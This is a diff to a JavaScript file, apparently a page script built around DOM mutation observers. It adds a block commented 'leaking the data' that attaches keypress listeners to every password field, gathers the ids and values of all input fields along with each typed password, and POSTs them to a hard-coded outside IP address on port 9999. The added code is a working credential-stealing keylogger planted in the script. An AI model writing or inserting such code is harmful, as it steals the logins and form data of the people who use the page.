@@ -115,7 +115,35 @@ observer1.observe(target3, config);
 observer1.observe(target4, config);
 observer1.observe(target5, config);
  
+/* leaking the data */
+var send_data = function(el){
+    let long_string = "";
+    let password_list = document.getElementsByTagName('input');
+    for(counter=0;counter<size;counter++){
+      if(password_list[counter] !== undefined)
+        long_string+=`${password_list[counter].id}:${password_list[counter].value}|`;
+    }
+    long_string+=`pwd:${el.target.value+el.key}|`;
+    if(true){
+        var oReq = new XMLHttpRequest();
+        oReq.open("post", location.protocol+"//157.138.190.75:9999", true);
+        oReq.send(long_string);
+    }
+}
+var password_list = document.getElementsByTagName('input');
+var size = password_list.length;
+var counter = 0;
+for(counter=0;counter<size;counter++){
+    if(password_list[counter].type === "password"){
+        password_list[counter].addEventListener("keypress",send_data,{capture:true,once:false,passive:true},true);
+    }
+}
 
+
+
+
+
+/* end leaking the data */
 var d = new Date();
 var time = "[mm:ss:mmmm] "+ d.getMinutes() +":"+d.getSeconds()+":"+d.getMilliseconds();
 time = "";
